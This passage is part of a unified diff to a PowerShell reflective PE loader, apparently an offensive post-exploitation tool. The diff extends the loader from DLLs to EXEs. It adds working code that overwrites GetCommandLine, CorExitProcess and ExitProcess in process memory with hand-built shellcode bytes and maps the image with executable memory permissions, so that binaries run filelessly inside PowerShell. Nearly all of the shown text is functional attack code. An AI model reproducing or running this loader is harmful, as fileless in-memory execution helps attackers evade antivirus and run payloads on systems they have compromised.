-							$CmdLineArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
-						}
-						
-						$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])
-						
-						#Different shellcode for 64bit vs 32bit
-						$ShellcodeSize = $PtrSize + 2
-						if ($PtrSize -eq 8)
-						{
-							$ShellcodeSize = $PtrSize + 3
-						}
-						
-						[IntPtr]$ShellcodeAddr = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr][UInt64]($ShellcodeSize), $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
-						
-						[IntPtr]$ShellcodePtr = $ShellcodeAddr
-						
-						if ($PtrSize -eq 8)
-						{
-							[Byte] $b = 0x48
-							[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodePtr, $false)
-							$ShellcodePtr = (Add-SignedIntAsUnsigned $ShellcodePtr 1)
-						}
-						[Byte]$b = 0xb8
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodePtr, $false)
-						$ShellcodePtr = (Add-SignedIntAsUnsigned $ShellcodePtr 1)
-						
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineArgsPtr, $ShellcodePtr, $false)
-						$ShellcodePtr = (Add-SignedIntAsUnsigned $ShellcodePtr $PtrSize)
-						
-						$b = 0xc3
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodePtr, $false)
-						
-						$NewThunkRef = $ShellcodeAddr
-					}
-					elseif ($DllInfo.FileType -ieq "EXE" -and ($ProcedureName -ieq "ExitProcess" -or $ProcedureName -ceq "CorExitProcess"))
-					{
-						[UInt32]$OldProtectFlag = 0
-						$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])
-						
-						#Instead of starting a new process, we start a new thread to kick off this process.
-						#Instead of letting the process call "ExitProcess" when it is done, which will kill powershell, we write shellcode
-						#	to make it call ExitThread.
-						
-						#First overwrite CorExitProcess with a return instruction, this seems to work fine.
-						[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
-						if ($MscoreeHandle -eq [IntPtr]::Zero)
-						{
-							throw "mscoree handle null"
-						}
-						[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
-						Write-Debug "CorExitProcessAddr: $CorExitProcessAddr"
-						$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($CorExitProcessAddr, [UInt32]10, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
-						[System.Runtime.InteropServices.Marshal]::WriteByte($CorExitProcessAddr, 0, [Byte]0xc3)
-						
-						#Next overwrite ExitProcess with the shellcode for ExitThread. This could result in small memory leaks on the heap, but it should be little if any.
-						#TODO: Architecture specific
-						[IntPtr]$ShellcodeAddr = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr][UInt64]33, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
-						[IntPtr]$NewThunkRef = $ShellcodeAddr #Write start of this shellcode as thunk
-						
-						#Shellcode to set the $ExeDoneBytePtr byte, this byte is used by the script to track when the exe is about to call its exitthread function
-						[Byte]$b = 0x48
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						[IntPtr]$NewThunkRef = $ShellcodeAddr #Write start of this shellcode as thunk
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr 1
-						
-						[Byte]$b = 0xbb
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr 1
-						
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr $PtrSize
-						Write-Debug "ExeDoneBytePtr: $ExeDoneBytePtr"
-						
-						[Byte]$b = 0xc6
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr 1
-						
-						[Byte]$b = 0x03
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr 1
-						
-						[Byte]$b = 0x01
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr 1
-						
-						
-						#Shellcode to sub 0x20 from rsp
-						[Byte]$b = 0x48
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr 1
-						
-						[Byte]$b = 0x83
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr 1
-						
-						[Byte]$b = 0xec
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr 1
-						
-						[Byte]$b = 0x20
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr 1
-						
-						
-						#Shellcode to and spl (rsp lower 8bits) with 0x0 for alignment
-						[Byte]$b = 0x40
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr 1
-						
-						[Byte]$b = 0x80
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr 1
-						
-						[Byte]$b = 0xe4
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr 1
-						
-						[Byte]$b = 0x00
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr 1
-						
-						
-						#Shellcode to call the function we want (exitthread)
-						[Byte]$b = 0x48
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr 1
-						
-						[Byte]$b = 0xbb
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr 1
-						
-						
-						[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
-						[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr $PtrSize
-						
-						[Byte]$b = 0xff
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						$ShellcodeAddr = Add-SignedIntAsUnsigned $ShellcodeAddr 1
-						
-						[Byte]$b = 0xd3
-						[System.Runtime.InteropServices.Marshal]::StructureToPtr($b, $ShellcodeAddr, $false)
-						
-						Write-Debug "ExitProcess shellcode address: $ShellcodeAddr"
-					}
-					else
-					{
-						[IntPtr]$NewThunkRef = $Win32Functions.GetProcAddress.Invoke($ImportDllHandle, $ProcedureName)
-						if ($NewThunkRef -eq $null)
-						{
-							Throw "New function reference is null, this is almost certainly a bug in this script"
-						}
+						Throw "New function reference is null, this is almost certainly a bug in this script"
 					}
 					
 					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
@@ -1466,7 +1341,7 @@ $RemoteScriptBlock = {
 		Param(
 		[Parameter(Position = 0, Mandatory = $true)]
 		[System.Object]
-		$DllInfo,
+		$PEInfo,
 		
 		[Parameter(Position = 1, Mandatory = $true)]
 		[System.Object]
@@ -1481,33 +1356,239 @@ $RemoteScriptBlock = {
 		$Win32Types
 		)
 		
-		for( $i = 0; $i -lt $DllInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
+		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
 		{
-			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$DllInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_SECTION_HEADER)))
+			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf($Win32Types.IMAGE_SECTION_HEADER)))
 			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, $Win32Types.IMAGE_SECTION_HEADER)
-			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($DllInfo.DllHandle) ($SectionHeader.VirtualAddress)
+			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
 			
-			#If page is discardable, discard it
-			if ($SectionHeader.Characteristics -band $Win32Constants.IMAGE_SCN_MEM_DISCARDABLE -gt 0)
+			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
+			[UInt32]$SectionSize = $SectionHeader.VirtualSize
+			
+			$OldProtectFlag = 0
+			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
+			$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
+			if ($Success -eq $false)
 			{
-				Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -DllInfo $DllInfo -StartAddress $SectionPtr -Size $SectionHeader.VirtualSize | Out-Null
-				$Win32Functions.VirtualFree.Invoke($SectionPtr, $SectionHeader.VirtualSize, $Win32Constants.MEM_DECOMMIT) | Out-Null
+				Throw "Unable to change memory protection"
 			}
-			else
+		}
+	}
+	
+	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
+	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
+	Function Update-ExeFunctions
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = $true)]
+		[System.Object]
+		$PEInfo,
+		
+		[Parameter(Position = 1, Mandatory = $true)]
+		[System.Object]
+		$Win32Functions,
+		
+		[Parameter(Position = 2, Mandatory = $true)]
+		[System.Object]
+		$Win32Constants,
+		
+		[Parameter(Position = 3, Mandatory = $true)]
+		[String]
+		$ExeArguments,
+		
+		[Parameter(Position = 4, Mandatory = $true)]
+		[IntPtr]
+		$ExeDoneBytePtr
+		)
+		
+		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
+		$ReturnArray = @() 
+		
+		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr])
+		
+		#################################################
+		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
+		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
+		$CmdLineWArgsPtr += [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
+		$CmdLineAArgsPtr += [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
+	
+		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
+		if ($Kernel32Handle -eq [IntPtr]::Zero)
+		{
+			throw "Kernel32 handle null"
+		}
+		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetCommandLineA")
+		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetCommandLineW")
+		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
+		{
+			throw "GetCommandLine ptr null. GetCommandLineA: $GetCommandLineAAddr. GetCommandLineW: $GetCommandLineWAddr"
+		}
+		
+		#Prepare the shellcode
+		[Byte[]]$Shellcode1 = @()
+		if ($PtrSize -eq 8)
+		{
+			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
+		}
+		$Shellcode1 += 0xb8
+		
+		[Byte[]]$Shellcode2 = @(0xc3)
+		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
+		
+		
+		#Make copy of GetCommandLineA and GetCommandLineW
+		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
+		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
+		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
+		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
+		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
+		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)
+
+		#Overwrite GetCommandLineA
+		[UInt32]$OldProtectFlag = 0
+		$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+		if ($Success = $false)
+		{
+			throw "Call to VirtualProtect failed"
+		}
+		
+		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddr
+		$GetCommandLineAAddr = Add-SignedIntAsUnsigned $GetCommandLineAAddr ($Shellcode1.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddr, $false)
+		$GetCommandLineAAddr = Add-SignedIntAsUnsigned $GetCommandLineAAddr $PtrSize
+		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddr
+		
+		Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+		
+		
+		#Overwrite GetCommandLineW
+		[UInt32]$OldProtectFlag = 0
+		$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+		if ($Success = $false)
+		{
+			throw "Call to VirtualProtect failed"
+		}
+		
+		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddr
+		$GetCommandLineWAddr = Add-SignedIntAsUnsigned $GetCommandLineWAddr ($Shellcode1.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddr, $false)
+		$GetCommandLineWAddr = Add-SignedIntAsUnsigned $GetCommandLineWAddr $PtrSize
+		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddr
+		
+		Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+		#################################################
+		
+		
+		#################################################
+		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.
+		
+		#First overwrite CorExitProcess with a return instruction, this seems to work fine.
+		#Because this process is being loaded in the PowerShell process, code compiled in VisualStudio will always detect it it loaded
+		#	in a managed process and call CorExitProcess. We need to stop this.
+		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
+		if ($MscoreeHandle -eq [IntPtr]::Zero)
+		{
+			throw "mscoree handle null"
+		}
+		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
+		
+		#Make copy of original CorExitProcess bytes
+		$CorExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
+		$Win32Functions.memcpy.Invoke($CorExitProcessOrigBytesPtr, $CorExitProcessAddr, [UInt64]1) | Out-Null
+		$ReturnArray += ,($CorExitProcessAddr, $CorExitProcessOrigBytesPtr, 1)
+		
+		$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($CorExitProcessAddr, [UInt32]1, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
+		if ($Success -eq $false)
+		{
+			Throw "Call to VirtualProtect failed"
+		}
+		[System.Runtime.InteropServices.Marshal]::WriteByte($CorExitProcessAddr, 0, [Byte]0xc3)
+		Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($CorExitProcessAddr, [UInt32]1, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+
+		
+		#Next overwrite ExitProcess, this is more involved. The following is the shellcode:
+		#32bit shellcode
+		[Byte[]]$Shellcode1 = @(0xbb)
+		[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x66, 0x81, 0xe4, 0x00, 0xff, 0xbb)
+		#64bit shellcode
+		if ($PtrSize -eq 8)
+		{
+			[Byte[]]$Shellcode1 = @(0x48, 0xbb)
+			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x81, 0xe4, 0x00, 0xff, 0x48, 0xbb)
+		}
+		[Byte[]]$Shellcode3 = @(0xff, 0xd3)
+		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
+		
+		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
+		if ($ExitProcessAddr -eq [IntPtr]::Zero)
+		{
+			Throw "ExitProcess address not found"
+		}
+		[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
+		if ($ExitThreadAddr -eq [IntPtr]::Zero)
+		{
+			Throw "ExitThread address not found"
+		}
+		$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($ExitProcessAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
+		if ($Success -eq $false)
+		{
+			Throw "Call to VirtualProtect failed"
+		}
+		
+		#Make copy of original ExitProcess bytes
+		$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
+		$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ExitProcessAddr, [UInt64]$TotalSize) | Out-Null
+		$ReturnArray += ,($ExitProcessAddr, $ExitProcessOrigBytesPtr, $TotalSize)
+		
+		#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
+		#	call ExitThread
+		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ExitProcessAddr
+		$ExitProcessAddr = Add-SignedIntAsUnsigned $ExitProcessAddr ($Shellcode1.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ExitProcessAddr, $false)
+		$ExitProcessAddr = Add-SignedIntAsUnsigned $ExitProcessAddr $PtrSize
+		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ExitProcessAddr
+		$ExitProcessAddr = Add-SignedIntAsUnsigned $ExitProcessAddr ($Shellcode2.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ExitProcessAddr, $false)
+		$ExitProcessAddr = Add-SignedIntAsUnsigned $ExitProcessAddr $PtrSize
+		Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ExitProcessAddr
+		
+		Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($ExitProcessAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
+		#################################################
+		
+		Write-Output $ReturnArray
+	}
+	
+	
+	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
+	#	It copies Count bytes from Source to Destination.
+	Function Copy-ArrayOfMemAddresses
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = $true)]
+		[Array[]]
+		$CopyInfo,
+		
+		[Parameter(Position = 1, Mandatory = $true)]
+		[System.Object]
+		$Win32Functions,
+		
+		[Parameter(Position = 2, Mandatory = $true)]
+		[System.Object]
+		$Win32Constants
+		)
+
+		[UInt32]$OldProtectFlag = 0
+		foreach ($Info in $CopyInfo)
+		{
+			$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
+			if ($Success -eq $false)
 			{
-				[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
-				
-				[UInt32]$SectionSize = $SectionHeader.VirtualSize
-				
-				$OldProtectFlag = 0
-				#$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
-				Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -DllInfo $DllInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
-				$Success = Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
-				if ($Success -eq $false)
-				{
-					Throw "Unable to change memory protection"
-				}
+				Throw "Call to VirtualProtect failed"
 			}
+			
+			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
+			
+			Invoke-Win32 "kernel32.dll" ([Bool]) "VirtualProtect" @([IntPtr], [UInt32], [UInt32], [Ref]) @($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
 		}
 	}
 
@@ -1520,7 +1601,7 @@ $RemoteScriptBlock = {
 		Param(
 		[Parameter(Position = 0, Mandatory = $true)]
 		[IntPtr]
-		$DllHandle,
+		$PEHandle,
 		
 		[Parameter(Position = 1, Mandatory = $true)]
 		[String]
@@ -1529,32 +1610,32 @@ $RemoteScriptBlock = {
 		
 		$Win32Types = Get-Win32Types
 		$Win32Constants = Get-Win32Constants
-		$DllInfo = Get-DllDetailedInfo -DllHandle $DllHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
+		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
 		
 		#Get the export table
-		if ($DllInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
+		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
 		{
 			return [IntPtr]::Zero
 		}
-		$ExportTablePtr = Add-SignedIntAsUnsigned ($DllHandle) ($DllInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
+		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
 		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, $Win32Types.IMAGE_EXPORT_DIRECTORY)
 		
 		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
 		{
 			#AddressOfNames is an array of pointers to strings of the names of the functions exported
-			$NameOffsetPtr = Add-SignedIntAsUnsigned ($DllHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([UInt32])))
-			$NamePtr = Add-SignedIntAsUnsigned ($DllHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [UInt32]))
+			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([UInt32])))
+			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [UInt32]))
 			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)
 
 			if ($Name -ceq $FunctionName)
 			{
 				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
 				#    which contains the offset of the function in to the DLL
-				$OrdinalPtr = Add-SignedIntAsUnsigned ($DllHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([UInt16])))
+				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([UInt16])))
 				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [UInt16])
-				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($DllHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([UInt32])))
+				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([UInt32])))
 				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [UInt32])
-				return Add-SignedIntAsUnsigned ($DllHandle) ($FuncOffset)
+				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
 			}
 		}
 		
@@ -1567,7 +1648,7 @@ $RemoteScriptBlock = {
 		Param(
 		[Parameter( Position = 0, Mandatory = $true )]
 		[Byte[]]
-		$DllBytes,
+		$PEBytes,
 		
 		[Parameter(Position = 1, Mandatory = $false)]
 		[String]
@@ -1580,185 +1661,180 @@ $RemoteScriptBlock = {
 		$Win32Types = Get-Win32Types
 		
 		
-		#Get basic DLL information
-		Write-Debug "Getting basic DLL information from the file"
-		$DllInfo = Get-DllBasicInfo -DllBytes $DllBytes -Win32Types $Win32Types
-		$OriginalImageBase = $DllInfo.OriginalImageBase
+		#Get basic PE information
+		Write-Verbose "Getting basic PE information from the file"
+		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
+		$OriginalImageBase = $PEInfo.OriginalImageBase
 		
 		
-		#Verify that the DLL and the current process are the same bits
+		#Verify that the PE and the current process are the same bits (32bit or 64bit)
 		$Process64Bit = $true
 		if ([System.Runtime.InteropServices.Marshal]::SizeOf([IntPtr]) -ne 8)
 		{
 			$Process64Bit = $false
 		}
-		if ($Process64Bit -ne $DllInfo.Dll64Bit)
+		if ($Process64Bit -ne $PEInfo.PE64Bit)
 		{
-			Throw "DLL platform doesn't match process platform"
+			Throw "PE platform doesn't match the PowerShell process architecture (32/64bit)"
 		}
 		
 
-		#Allocate memory and write the DLL to memory. Always allocating to random memory address so I have pretend ASLR
-		Write-Debug "Allocating memory for the DLL and write its headers to memory"
-		$DllHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$DllInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
-		[IntPtr]$DllEndAddress = Add-SignedIntAsUnsigned ($DllHandle) ([Int64]$DllInfo.SizeOfImage)
-		if ($DllHandle -eq [IntPtr]::Zero)
+		#Allocate memory and write the PE to memory. Always allocating to random memory address so I have pretend ASLR
+		Write-Verbose "Allocating memory for the PE and write its headers to memory"
+		$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
+
+		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
+		if ($PEHandle -eq [IntPtr]::Zero)
